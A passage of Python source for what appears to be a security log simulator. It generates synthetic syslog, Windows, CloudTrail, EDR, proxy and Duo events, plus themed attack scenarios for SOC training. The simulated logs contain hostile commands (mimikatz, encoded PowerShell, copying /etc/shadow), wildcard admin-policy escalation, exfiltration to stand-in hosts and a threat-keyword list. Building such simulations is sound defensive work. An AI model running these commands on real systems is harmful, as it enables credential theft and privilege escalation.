                                 category=random.choice(["Anonymizers", "Compromised", "Peer-to-Peer"]),
                                 blocked=True, url="http://" + random.choice(DNS_SUSPICIOUS)[0])
    return _email_line(event)

def gen_db_audit() -> str:
    """PostgreSQL pgAudit record from the LexCorp Inc. financial/royalty DB."""
    op   = random.choice(OPERATIVES)
    obj  = random.choice(DB_OBJECTS)
    cmd, cls = random.choice([("SELECT", "READ"), ("SELECT", "READ"), ("SELECT", "READ"),
                              ("UPDATE", "WRITE"), ("DELETE", "WRITE"), ("INSERT", "WRITE")])
    rows = random.choice([1, 1, 3, 12, 47, 1847])  # 1847 = whole roster
    stmt = {
        "SELECT": f"SELECT * FROM {obj.split('.')[1]} WHERE clearance='{op['clearance']}'",
        "UPDATE": f"UPDATE {obj.split('.')[1]} SET status='BURNED' WHERE id={random.randint(1,9999)}",
        "DELETE": f"DELETE FROM {obj.split('.')[1]} WHERE id={random.randint(1,9999)}",
        "INSERT": f"INSERT INTO {obj.split('.')[1]} (alias) VALUES ('{op['alias']}')",
    }[cmd]
    sid = random.randint(1, 99999)
    msg = (f"{op['name']}@{DB_NAME} LOG:  AUDIT: SESSION,{sid},1,{cls},{cmd},TABLE,{obj},"
           f'"{stmt}",<not logged> rows={rows}')
    sev = 4 if rows >= 1000 or cls == "WRITE" else 6
    return rfc5424(sev, 16, "avengers-db01.lexcorp.com", "postgres", str(random.randint(1000,9999)),
                   "DBAUDIT", msg)

# Maps the old flat PascalCase field names (still used as scenario call-site
# kwargs, for readability) to this tenant's real deployed Windows Event Logs
# rules' lowerCamelCase winEventLog.data.event.eventData.* field names.
_WIN_PROVIDER_GUIDS = {
    "Microsoft-Windows-Security-Auditing": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
}

def _win_event_xml(comp: str, eid: int, event_data: dict, *, channel: str = "Security",
                    provider: str = "Microsoft-Windows-Security-Auditing",
                    task: int = 12544, keywords: str = "0x8020000000000000") -> str:
    """Genuine Windows Event Log XML -- the real <Event> schema Event Viewer/
    Windows Event Collector produce (see
    https://learn.microsoft.com/windows/win32/wes/eventschema-eventtype-complextype),
    not a JSON approximation. `event_data` keys must be the real Microsoft
    Security-Auditing field names (TargetUserName, LogonType, ...) since they
    become literal <Data Name="..."> elements -- exactly what a real
    `wevtutil qe /f:xml` dump looks like, description text and all omitted
    (Windows renders that from a message-table DLL at display time, it's
    never part of the raw event XML)."""
    now = datetime.now(timezone.utc)
    ns = "http://schemas.microsoft.com/win/2004/08/events/event"
    ET.register_namespace("", ns)
    event = ET.Element(f"{{{ns}}}Event")

    system = ET.SubElement(event, f"{{{ns}}}System")
    prov = ET.SubElement(system, f"{{{ns}}}Provider")
    prov.set("Name", provider)
    prov.set("Guid", _WIN_PROVIDER_GUIDS.get(provider, "{00000000-0000-0000-0000-000000000000}"))
    ET.SubElement(system, f"{{{ns}}}EventID").text = str(eid)
    ET.SubElement(system, f"{{{ns}}}Version").text = "1"
    ET.SubElement(system, f"{{{ns}}}Level").text = "0"
    ET.SubElement(system, f"{{{ns}}}Task").text = str(task)
    ET.SubElement(system, f"{{{ns}}}Opcode").text = "0"
    ET.SubElement(system, f"{{{ns}}}Keywords").text = keywords
    tc = ET.SubElement(system, f"{{{ns}}}TimeCreated")
    tc.set("SystemTime", now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z")
    ET.SubElement(system, f"{{{ns}}}EventRecordID").text = str(random.randint(100_000_000, 999_999_999))
    ET.SubElement(system, f"{{{ns}}}Correlation")
    execution = ET.SubElement(system, f"{{{ns}}}Execution")
    execution.set("ProcessID", str(random.randint(500, 5000)))
    execution.set("ThreadID", str(random.randint(500, 5000)))
    ET.SubElement(system, f"{{{ns}}}Channel").text = channel
    ET.SubElement(system, f"{{{ns}}}Computer").text = f"{comp}.NEXUS.LOCAL"
    ET.SubElement(system, f"{{{ns}}}Security").set("UserID", "S-1-5-18")

    event_data_el = ET.SubElement(event, f"{{{ns}}}EventData")
    for name, value in event_data.items():
        data_el = ET.SubElement(event_data_el, f"{{{ns}}}Data")
        data_el.set("Name", name)
        data_el.text = str(value)

    return ET.tostring(event, encoding="unicode")

def gen_win_event() -> str:
    """Windows Security Event log -- genuine Windows Event Log XML (see
    _win_event_xml). Field names below are the real Microsoft
    Security-Auditing schema names (PascalCase), since they become literal
    <Data Name="..."> elements."""
    comp = random.choice(WIN_HOSTS)
    op   = random.choice(OPERATIVES)
    eid  = random.choices([4624, 4625, 4768, 4769, 4688, 4740, 4672],
                          weights=[6, 4, 3, 3, 4, 1, 2])[0]
    sev = 6
    if eid == 4624:
        lt = random.choice(list(WIN_LOGON_TYPES))
        data = {"TargetUserName": op["name"], "TargetDomainName": "NEXUS",
                "LogonType": lt, "IpAddress": random.choice(EXTERNAL_IPS + INTERNAL_IPS)}
    elif eid == 4625:
        st, sub, reason = random.choice(WIN_FAIL_STATUS)
        data = {"TargetUserName": op["alias"], "TargetDomainName": "NEXUS",
                "LogonType": 3, "Status": st, "SubStatus": sub, "FailureReason": reason,
                "IpAddress": random.choice(EXTERNAL_IPS)}
        sev = 4
    elif eid == 4768:
        data = {"TargetUserName": op["name"], "TargetDomainName": "NEXUS.LOCAL",
                "ServiceName": "krbtgt", "TicketEncryptionType": "0x12",
                "IpAddress": random.choice(INTERNAL_IPS)}
    elif eid == 4769:
        enc = random.choice(["0x12", "0x12", "0x17"])  # 0x17 = RC4 → kerberoastable
        data = {"TargetUserName": f"{op['name']}@NEXUS.LOCAL",
                "ServiceName": random.choice(["MSSQLSvc/avengers-db01", "HTTP/wakanda-ctrl01",
                                              "CIFS/nexus-core-dc01"]),
                "TicketEncryptionType": enc, "IpAddress": random.choice(INTERNAL_IPS)}
        if enc == "0x17":
            sev = 4
    elif eid == 4688:
        proc = random.choice(["powershell.exe -enc SQBFAFgA", "cmd.exe /c whoami /all",
                              "rundll32.exe", "mimikatz.exe", "net.exe group \"Domain Admins\""])
        data = {"NewProcessName": f"C:\\Windows\\System32\\{proc.split()[0]}",
                "CommandLine": proc, "ParentProcessName": "C:\\Windows\\explorer.exe",
                "SubjectUserName": op["name"]}
    elif eid == 4740:
        data = {"TargetUserName": op["alias"], "CallerComputerName": random.choice(WIN_HOSTS)}
        sev = 4
    else:  # 4672
        data = {"SubjectUserName": op["name"], "PrivilegeList": "SeDebugPrivilege, SeTcbPrivilege"}
    xml_body = _win_event_xml(comp, eid, data)
    return rfc5424(sev, 13, f"{comp.lower()}.lexcorp.com", "Security", "-", "WINEVENT", xml_body)

def _cloudtrail_event(op: dict, program: str, event_name: str, event_source: str,
                       request_params: dict | None = None, response_elements: dict | None = None,
                       read_only: bool = True, mfa: bool = True, source_ip: str | None = None,
                       error_code: str | None = None, error_message: str | None = None,
                       root: bool = False) -> dict:
    """Build a realistic CloudTrail record for a benign, MFA-enforced AssumeRole session."""
    account = AWS_ACCOUNTS[program]
    role = AWS_ROLES[program]
    region = random.choice(AWS_REGIONS)
    now = datetime.now(timezone.utc)
    principal_id = "AROA" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=16))
    event = {
        "eventVersion": "1.08",
        "userIdentity": {"type": "Root", "principalId": account, "accountId": account,
                          "arn": f"arn:aws:iam::{account}:root"} if root else {
            "type": "AssumedRole",
            "principalId": f"{principal_id}:{op['name']}",
            "arn": f"arn:aws:sts::{account}:assumed-role/{role}/{op['name']}",
            "accountId": account,
            "sessionContext": {
                "sessionIssuer": {"type": "Role", "principalId": principal_id,
                                  "arn": f"arn:aws:iam::{account}:role/{role}", "accountId": account},
                "attributes": {"mfaAuthenticated": "true" if mfa else "false",
                               "creationDate": now.strftime("%Y-%m-%dT%H:%M:%SZ")},
            },
        },
        "eventTime": now.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "eventSource": event_source,
        "eventName": event_name,
        "awsRegion": region,
        "sourceIPAddress": source_ip or random.choice(AWS_TRUSTED_SOURCE_IPS),
        "userAgent": random.choice(["aws-cli/2.15.0", "console.amazonaws.com",
                                     "Boto3/1.34.0 Python/3.12"]),
        "requestParameters": request_params or {},
        "responseElements": response_elements,
        "requestID": "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)),
        "eventID": "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)),
        "readOnly": read_only,
        "eventType": "AwsApiCall",
        "managementEvent": True,
        "recipientAccountId": account,
    }
    if error_code:
        event["errorCode"] = error_code
        event["errorMessage"] = error_message
    return event

def _cloudtrail_line(event: dict, sev: int = 6) -> str:
    return rfc5424(sev, 13, "cloudtrail-delivery.lexcorp.com", "cloudtrail", "-", "CLOUDTRAIL",
                   json.dumps(event, separators=(",", ":")))

def gen_cloudtrail_event() -> str:
    """Ambient AWS CloudTrail traffic -- entirely within security guardrails.

    Every event here is MFA-authenticated AssumedRole traffic from a trusted
    corporate egress IP. The occasional AccessDenied is the org's
    least-privilege boundary working as intended, not a gap.
    """
    program = random.choice(list(AWS_ACCOUNTS))
    op = random.choice(OPERATIVES)
    bucket = AWS_S3_BUCKETS[program]
    account = AWS_ACCOUNTS[program]

    choice = random.choices(
        ["console_login", "get_object", "put_object", "describe_instances", "access_denied"],
        weights=[3, 4, 2, 3, 2],
    )[0]

    if choice == "console_login":
        event = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com",
                                   response_elements={"ConsoleLogin": "Success"})
    elif choice == "get_object":
        event = _cloudtrail_event(op, program, "GetObject", "s3.amazonaws.com",
                                   request_params={"bucketName": bucket, "key": f"reports/{op['name']}.json.enc"})
    elif choice == "put_object":
        event = _cloudtrail_event(op, program, "PutObject", "s3.amazonaws.com", read_only=False,
                                   request_params={"bucketName": bucket, "key": f"uploads/{op['name']}-{random.randint(1000,9999)}.enc",
                                                    "x-amz-server-side-encryption": "aws:kms"})
    elif choice == "describe_instances":
        event = _cloudtrail_event(op, program, "DescribeInstances", "ec2.amazonaws.com",
                                   request_params={"filterSet": {}})
    else:  # access_denied -- a correctly scoped-out role hitting a boundary. Not another program's data.
        other_program = random.choice([p for p in AWS_ACCOUNTS if p != program])
        event = _cloudtrail_event(op, program, "GetObject", "s3.amazonaws.com",
                                   request_params={"bucketName": AWS_S3_BUCKETS[other_program], "key": "restricted"},
                                   error_code="AccessDenied",
                                   error_message=f"User: arn:aws:sts::{account}:assumed-role/{AWS_ROLES[program]}/{op['name']} is not authorized to perform this action")
    return _cloudtrail_line(event, sev=4 if choice == "access_denied" else 6)

def _proc(name: str, cmdline: str, *, display_name: str | None = None, publisher: str | None = None,
          user: str | None = None, image_path: str | None = None,
          parent: dict | None = None) -> dict:
    """Build a src.process/tgt.process-shaped dict (real field names -- see EDR schema note)."""
    p: dict = {"name": name, "cmdline": cmdline}
    if display_name: p["displayName"] = display_name
    if publisher: p["publisher"] = publisher
    if user: p["user"] = user
    if image_path: p["image"] = {"path": image_path, "originalFileName": name}
    if parent: p["parent"] = parent
    return p

def _edr_event(event_type: str, endpoint: str, *, category: str = "Process", site: str = "NEXUS-GLOBAL",
                src_process: dict | None = None, tgt_process: dict | None = None,
                tgt_file: dict | None = None, src_ip: str | None = None, src_port: int | None = None,
                dst_ip: str | None = None, dst_port: int | None = None, net_direction: str | None = None,
                registry: dict | None = None, task_path: str | None = None, module_path: str | None = None,
                cmd_script: str | None = None, dns_request: str | None = None,
                indicator: dict | None = None) -> dict:
    """Build a realistic SentinelOne EDR event. Field names grounded in this
    tenant's own deployed rules (data/extracted.json) -- see the EDR schema
    note above EDR_ENDPOINTS."""
    os_name = EDR_ENDPOINTS.get(endpoint, "windows")
    now = datetime.now(timezone.utc)
    event: dict = {
        "dataSource": {"name": "SentinelOne", "vendor": "SentinelOne", "category": "security"},
        "event": {"type": event_type, "category": category,
                  "time": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"},
        "endpoint": {"os": os_name, "name": endpoint,
                     "type": "server" if endpoint.upper() in ("NEXUS-CORE-DC01", "AVENGERS-DB01") else "workstation"},
        # NOTE: named "s1Agent", not "agent" -- "agent" is a reserved envelope
        # key (sgcia's forwarder tag) and would otherwise collide.
        "s1Agent": {"uuid": "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)),
                    "version": EDR_AGENT_VERSION},
        "site": {"name": site},
        "account": {"name": "Citadel-Media"},
    }
    src: dict = {}
    if src_process: src["process"] = src_process
    if src_ip: src["ip"] = {"address": src_ip}
    if src_port: src["port"] = {"number": src_port}
    if src: event["src"] = src

    tgt: dict = {}
    if tgt_process: tgt["process"] = tgt_process
    if tgt_file: tgt["file"] = tgt_file
    if tgt: event["tgt"] = tgt

    dst: dict = {}
    if dst_ip: dst["ip"] = {"address": dst_ip}
    if dst_port: dst["port"] = {"number": dst_port}
    if dst: event["dst"] = dst
    if net_direction: event["event"]["network"] = {"direction": net_direction}
    if registry: event["registry"] = registry
    if task_path: event["task"] = {"path": task_path}
    if module_path: event["module"] = {"path": module_path}
    if cmd_script: event["cmdScript"] = {"content": cmd_script}
    if dns_request: event["event"]["dns"] = {"request": dns_request}
    if indicator: event["indicator"] = indicator
    return event

def _flatten(d: dict, prefix: str = "") -> dict:
    """Flatten a nested dict to SDL's dotted-key attrs shape (matches how
    FoundStone's own ingester.py / real detection rule pair_lists address
    fields, e.g. "tgt.process.cmdline")."""
    out: dict = {}
    for k, v in d.items():
        key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict):
            out.update(_flatten(v, key))
        else:
            out[key] = v
    return out

def _edr_line(event: dict, sev: int = 6) -> None:
    """Ingest an EDR event directly into SDL via addEvents -- bypassing
    sgcia/DataPipeline entirely (see the SDL_BASE_URL/SDL_WRITE_TOKEN
    comment near the top of this file). Returns None: there is nothing left
    for the caller to send over the sgcia TCP socket."""
    if not SDL_BASE_URL or not SDL_WRITE_TOKEN:
        log.warning("SDL_BASE_URL/SDL_WRITE_TOKEN not set -- skipping direct EDR ingest for %s",
                    event.get("event", {}).get("type"))
        return None

    attrs = _flatten(event)
    attrs["tags"] = "watchtower-simulation"
    now_ms = int(time.time() * 1000)
    now_ns = now_ms * 1_000_000  # addEvents requires nanoseconds since epoch -- a
                                  # millisecond `ts` is silently dropped (bytesCharged=0)
    payload = json.dumps({
        "token": SDL_WRITE_TOKEN,
        "session": f"watchtower-edr-{now_ms}-{random.randint(0, 999999)}",
        "events": [{"ts": str(now_ns), "attrs": attrs}],
    }).encode("utf-8")
    req = urllib.request.Request(
        f"{SDL_BASE_URL}/api/addEvents", data=payload,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            resp.read()
    except urllib.error.URLError as exc:
        log.error("Direct SDL ingest failed for EDR event (%s): %s",
                  event.get("event", {}).get("type"), exc)
    return None

def gen_s1_edr_event() -> None:
    """Ambient SentinelOne EDR traffic -- signed publishers, ordinary parent/child
    process trees. LOLBins, credential dumping, and persistence never appear
    here; only in the dedicated EDR attack scenarios."""
    endpoint = random.choice(list(EDR_ENDPOINTS))
    op = random.choice(OPERATIVES)
    parent_name, parent_cmd, child_name, child_cmd, publisher = random.choice(EDR_BENIGN_PROCS)

    choice = random.choices(
        ["process", "dns", "ip_connect", "file"], weights=[6, 3, 3, 2],
    )[0]

    if choice == "process":
        parent = _proc(parent_name, parent_cmd, publisher=publisher)
        tgt = _proc(child_name, child_cmd, publisher=publisher, user=op["name"], parent=parent)
        event = _edr_event("Process Creation", endpoint, tgt_process=tgt)
    elif choice == "dns":
        src = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
        event = _edr_event("DNS Resolved", endpoint, category="Network", src_process=src,
                            dns_request=random.choice(["login.microsoftonline.com", "www.bbc.co.uk",
                                                        "update.googleapis.com", "outlook.office365.com"]))
    elif choice == "ip_connect":
        src = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
        event = _edr_event("IP Connect", endpoint, category="Network", src_process=src,
                            src_ip=random.choice(INTERNAL_IPS), src_port=random.randint(49152, 65535),
                            dst_ip=random.choice(["20.190.160.14", "142.250.80.110", "151.101.0.81"]),
                            dst_port=443, net_direction="OUTGOING")
    else:  # file
        proc = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
        event = _edr_event("File Creation", endpoint, category="File", src_process=proc,
                            tgt_file={"path": f"C:\\Users\\{op['name']}\\Documents\\report.docx"
                                      if EDR_ENDPOINTS[endpoint] == "windows"
                                      else f"/home/{op['name']}/report.pdf",
                                      "name": "report", "extension": "docx" if EDR_ENDPOINTS[endpoint] == "windows" else "pdf"})
    return _edr_line(event)

def _fake_sha256() -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(random.choices(chars, k=43))

# ─── Scenario engine ────────────────────────────────────────────────────────────
#
# Scripted, correlated multi-source storylines grounded in real, well-documented
# 90s/2000s label/industry history. When a scenario fires, it emits a short burst
# of events across several sources that share actors/hosts/IPs — so a SOC analyst
# can pivot host→user→IP and watch an actual storyline unfold across firewall,
# identity, proxy and host logs.

def _ssh_line(host: str, body: str, sev: int = 6) -> str:
    return rfc5424(sev, 4, host, "sshd", str(random.randint(10000, 65535)), "SSHD", body)

def _sudo_line(host: str, user: str, cmd: str) -> str:
    body = f"{user} : TTY=pts/{random.randint(0,5)} ; PWD=/root ; USER=root ; COMMAND={cmd}"
    return rfc5424(5, 10, host, "sudo", str(random.randint(10000, 65535)), "SUDO", body)

def _http_line(host: str, src: str, user: str, method: str, path: str,
               status: int, size: int, ua: str = None) -> str:
    ua = ua or random.choice(USER_AGENTS)
    ts = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    clf = f'{src} - {user} [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'
    return rfc5424(6, 16, host, "apache2", str(random.randint(1000, 9999)), "HTTP", clf)

_PROXY_THREAT_KEYWORDS = ("exfil", "vault", "beacon", "c2", "securedrop",
                          "pastebin", "filebin", "recon", "federation")

def _proxy_line(host: str, client: str, code: str, status: int, bytes_: int,
                method: str, target: str, user: str, peer: str, ctype: str,
                sev: int = 6) -> str:
    """Zscaler Internet Access-shaped event (msgid PROXY). Field names
    grounded in this tenant's own deployed Zscaler-sourced rules (app_name,
    action, malware.name, http_request.url.hostname/categories,
    unmapped.event.threatcat, risk_details). Keeps the original Squid-style
    call signature so existing scenario call sites don't need to change --
    only the wire format is now Zscaler-shaped JSON instead of Squid text."""
    hostname = target.split("://")[-1].split("/")[0].split(":")[0]
    is_threat = any(k in target.lower() for k in _PROXY_THREAT_KEYWORDS)
    blocked = code == "TCP_DENIED"
    # Action reflects only whether THIS call was denied -- not whether the
    # destination is a threat. Scenarios that model a successful exfil pass a
    # non-denied code (e.g. TCP_TUNNEL) to a threat-keyword domain on purpose;
    # forcing that to "IPS Reset" would silently turn the exfil into a block.
    action = "Blocked" if blocked else "Allowed"
    event: dict = {
        "app_name": "Suspicious Web Activity" if is_threat else "Web Browsing",
        "action": action,
        "user": {"name": user},
        "client_ip": client,
        "http_request": {
            "method": method,
            "url": {"hostname": hostname,
                     "categories": ["Suspicious Destinations"] if is_threat else ["General Browsing"]},
        },
        "risk_details": "malicious" if is_threat else "benign",
        "bytes": bytes_,
        "time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    if is_threat:
        event["malware"] = {"name": "unknown.threat"}
        event["unmapped"] = {"event": {"threatcat": "c2"}}
    return rfc5424(sev, 16, host, "zscaler", str(random.randint(1000, 9999)), "PROXY",
                   json.dumps(event, separators=(",", ":")))

def _audit_line(host: str, src: str, dst: str, dpt: int) -> str:
    mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
    body = (f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC={mac} SRC={src} DST={dst} "
            f"LEN={random.randint(40,1500)} TOS=0x00 PREC=0x00 TTL={random.randint(40,128)} "
            f"ID={random.randint(1000,60000)} DF PROTO=TCP SPT={random.randint(49152,65535)} "
            f"DPT={dpt} WINDOW={random.randint(1024,65535)} RES=0x00 SYN URGP=0")
    return rfc5424(4, 0, host, "kernel", "-", "AUDIT", body)

def _duo_line(proxy: str, alias: str, clearance: str, app: str, ip: str,
              result: str, reason: str, factor: str = "duo_push") -> str:
    """Cisco Duo authentication event. Field names grounded in this tenant's
    real deployed Duo rules (status/status_detail/unmapped.event_type/
    unmapped.factor); see gen_duo_auth for the same shape's ambient version."""
    geo = IP_GEO.get(ip, {"city": "Unknown", "state": "Unknown", "country": "Unknown"})
    now = datetime.now(timezone.utc)
    txid = "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12))
    event = {
        "access_device": {
            "ip": ip,
            "location": {"city": geo["city"], "state": geo["state"], "country": geo["country"]},
            "browser": random.choice(["Chrome", "Firefox", "Edge", "Safari"]),
            "browser_version": f"{random.randint(110,124)}.0",
            "os": random.choice(["Windows", "Mac OS X", "Linux", "iOS", "Android"]),
            "os_version": f"{random.randint(10,15)}.{random.randint(0,6)}",
        },
        "application": {"name": app, "key": "DI" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18))},
        "auth_device": {
            "ip": ip,
            "location": {"city": geo["city"], "state": geo["state"], "country": geo["country"]},
            "name": f"+1 555-{random.randint(100,999)}-{random.randint(1000,9999)}",
        },
        "status": result,
        "status_detail": reason,
        "unmapped": {"event_type": "authentication", "factor": factor},
        "auth_timestamp": int(now.timestamp()),   # renamed from `timestamp` to avoid envelope collision
        "isotimestamp": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+00:00",
        "txid": txid,
        "user": {"name": alias, "key": "DU" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18)), "groups": [clearance]},
        "email": f"{alias}@{email_domain(clearance)}",
    }
    sev = {"fraud": 1, "denied": 4, "success": 6}[result]
    return rfc5424(sev, 13, proxy, "duo", "-", "DUO", json.dumps(event, separators=(",", ":")))

def _dns_line(host: str, client: str, domain: str, qtype: str = "A", sev: int = 6) -> str:
    cid = hex(random.randint(0x100000, 0xFFFFFF))
    msg = (f"client @{cid} {client}#{random.randint(1024,65535)} ({domain}): "
           f"query: {domain} IN {qtype} +E(0) ({random.choice(DNS_RESOLVERS)})")
    return rfc5424(sev, 3, host, "named", str(random.randint(100,9999)), "DNS", msg)

def _db_line(user: str, obj: str, cmd: str, cls: str, stmt: str, rows: int) -> str:
    sid = random.randint(1, 99999)
    msg = (f"{user}@{DB_NAME} LOG:  AUDIT: SESSION,{sid},1,{cls},{cmd},TABLE,{obj},"
           f'"{stmt}",<not logged> rows={rows}')
    sev = 4 if rows >= 1000 or cls == "WRITE" else 6
    return rfc5424(sev, 16, "avengers-db01.lexcorp.com", "postgres", str(random.randint(1000,9999)),
                   "DBAUDIT", msg)

def _win_line(comp: str, fields: dict, sev: int = 6) -> str:
    """Scenario call sites pass a flat PascalCase fields dict
    (EventID/Event/TargetUserName/...) for readability; this builds genuine
    Windows Event Log XML from it (see _win_event_xml). `Event` (the
    human-readable description) and `LogonTypeName` are display-only --
    real Windows Event XML never carries them, so both are dropped here
    rather than becoming (non-existent) <Data> elements."""
    fields = dict(fields)
    eid = fields.pop("EventID")
    fields.pop("Event", None)
    fields.pop("LogonTypeName", None)
    xml_body = _win_event_xml(comp, eid, fields)
    return rfc5424(sev, 13, f"{comp.lower()}.lexcorp.com", "Security", "-", "WINEVENT", xml_body)


def sc_cosmic_cube_heist_thanos():
    """COSMIC CUBE HEIST — a Thanos-motivated exfiltration of cosmic-cube
    fragment data pulled from the Avengers vault in bulk via a compromised
    Avengers account."""
    program = "AVENGERS"
    op = next(o for o in OPERATIVES if o["name"] == "tony.stark")
    ip = "96.8.124.201"
    bucket = AWS_S3_BUCKETS[program]
    login = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com",
                               response_elements={"ConsoleLogin": "Success"})
    bulk_get = _cloudtrail_event(op, program, "GetObject", "s3.amazonaws.com",
                                  request_params={"bucketName": bucket, "key": "restricted/cosmic-cube-fragment.tar.enc"})
    proc = _proc("bash", "-bash", user="tony.stark")
    file_event = _edr_event("File Creation", "AVENGERS-DB01", category="File", src_process=proc,
                             tgt_file={"path": "C:\\Users\\tony.stark\\Downloads\\cosmic-cube-fragment.tar.enc",
                                       "name": "cosmic-cube-fragment", "extension": "enc"})
    return ("Cosmic Cube Heist — cosmic-cube fragment data pulled from the Avengers vault in bulk", [
        _cloudtrail_line(login),
        _cloudtrail_line(bulk_get, sev=2),
        _panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["exfil"], ip, "10.1.0.1"),
        _proxy_line("station-metropolis-01.lexcorp.com", "10.1.0.1", "TCP_TUNNEL", 200, 8412233, "POST",
                    "https://api.cosmicvault.example.com/v1/export", "tony.stark", "HIER_DIRECT/"+ip, "application/json"),
        _edr_line(file_event, sev=2),
    ])

def sc_oscorp_privesc():
    """OSCORP SHELL ENTITY PRIVESC — AWS privilege escalation routed through a
    shady Oscorp shell entity, financial-crimes framing."""
    program = "AVENGERS"
    op = next(o for o in OPERATIVES if o["name"] == "tony.stark")
    login = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com",
                               response_elements={"ConsoleLogin": "Success"})
    attach = _cloudtrail_event(op, program, "AttachUserPolicy", "iam.amazonaws.com", read_only=False,
                                request_params={"userName": "tony.stark",
                                                 "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"})
    put_role = _cloudtrail_event(op, program, "PutRolePolicy", "iam.amazonaws.com", read_only=False,
                                  request_params={"roleName": AWS_ROLES[program], "policyName": "oscorp-self-escalate",
                                                   "policyDocument": "{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}"})
    return ("Oscorp Shell Entity Privesc — AdministratorAccess self-attached from an Oscorp shell entity", [
        _cloudtrail_line(login),
        _duo_line("gl-auth-proxy02.lexcorp.com", "captain.america", "AVENGERS", "Avengers Power Registry Portal",
                  "96.8.124.201", "success", "user_approved"),
        _cloudtrail_line(attach, sev=2),
        _cloudtrail_line(put_role, sev=2),
    ])

def sc_nexus_registry_pull():
    """NEXUS REGISTRY MASS PULL — an Ultron-7 rogue-AI service identity
    seizes the power registry, reading the full table and the cover-alias
    map at machine speed. Distinct behavioral signature from a human insider
    threat: no session pauses, no interactive shell drift between reads --
    it's the same A5 mass-DB-read mechanic as before, but the "actor" is a
    hijacked automation identity rather than a named operative (same
    external-actor treatment as Thanos in the cosmic-cube scenario)."""
    ip = "96.8.124.201"
    return ("Nexus Registry Mass Pull — Ultron-7 service identity seizes the full power registry", [
        _win_line("AVENGERS-DB01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 10, "LogonTypeName": "RemoteInteractive", "TargetUserName": "svc_ultron7",
                  "TargetDomainName": "NEXUS", "IpAddress": ip}),
        _db_line("svc_ultron7", "public.power_registry", "SELECT", "READ",
                 "SELECT * FROM power_registry", 1847),
        _db_line("svc_ultron7", "public.cover_aliases", "SELECT", "READ",
                 "SELECT alias,legal_name FROM cover_aliases", 612),
        _dns_line("nexus-core-dc01.lexcorp.com", "10.1.0.1", "exfil-relay.example.com", "A", sev=4),
        _proxy_line("ops-dmz-gw01.lexcorp.com", "10.1.0.1", "TCP_TUNNEL", 200, 6022144, "CONNECT",
                    "exfil-relay.example.com:443", "svc_ultron7", "HIER_DIRECT/70.121.55.33", "-"),
    ])

def sc_skrull_infiltration_talos():
    """SKRULL INFILTRATION — a Skrull (Talos) shape-shifted into Nick Fury's
    identity leaks unreleased intel/financials before the impersonation is
    caught. The login/DB-read/email trail is indistinguishable from the real
    Fury's own activity -- the tell is the impersonation email going out
    unblocked, not any credential anomaly (same A1b + A5 mechanic as the
    original insider-leak scenario, just reframed as literal identity theft
    rather than a willing defector)."""
    ip = "192.168.10.15"
    return ("Skrull Infiltration — a Skrull impersonating Fury leaks unreleased intel/financials", [
        _win_line("NEXUS-CORE-DC01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 2, "LogonTypeName": "Interactive", "TargetUserName": "nicholas.fury",
                  "TargetDomainName": "NEXUS", "IpAddress": ip}),
        _db_line("nicholas.fury", "public.faction_agreements", "SELECT", "READ",
                 "SELECT * FROM faction_agreements WHERE label='shield'", 1204),
        _email_line(_mimecast_event(recipient="nicholas.fury@"+email_domain("S.H.I.E.L.D."), sender_name="Nicholas Fury",
                    sender="fury@shield-directorate.example.org", subject="S.H.I.E.L.D. — unreleased intel + financials attached",
                    direction="outbound", event_type="TTP Impersonation Protection",
                    malicious=True, blocked=False)),
        _sudo_line("lexcorp-annex02.lexcorp.com", "nicholas.fury", "/bin/cp /etc/shadow /tmp/.hidden_s"),
        _panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["insider"], "10.0.0.1", "172.16.0.1"),
    ])

def sc_avengers_xmen_beacon():
    """AVENGERS/X-MEN BEACON — DNS/C2-style correlation between rival faction
    networks (infra only — no personal narrative)."""
    host, client, dom = "ops-dmz-gw01.lexcorp.com", "10.1.0.1", "c2.avengers-xmen-rivalry.example.net"
    lines = [_dns_line(host, client, dom, "TXT", sev=4) for _ in range(3)]
    lines.append(_panw_ids_line("noc-ids01.lexcorp.com", PANW_NARRATIVE_SIGNATURES["beacon"], client, "24.185.12.60"))
    lines.append(_panw_traffic_line("station-metropolis-01.lexcorp.com", client, "24.185.12.60", 443, "ssl"))
    return ("Avengers/X-Men Beacon — rival faction network correlation", lines)

def sc_multiverse_travel_anomaly():
    """MULTIVERSE-ADJACENT TRAVEL ANOMALY — correlated login/financial-
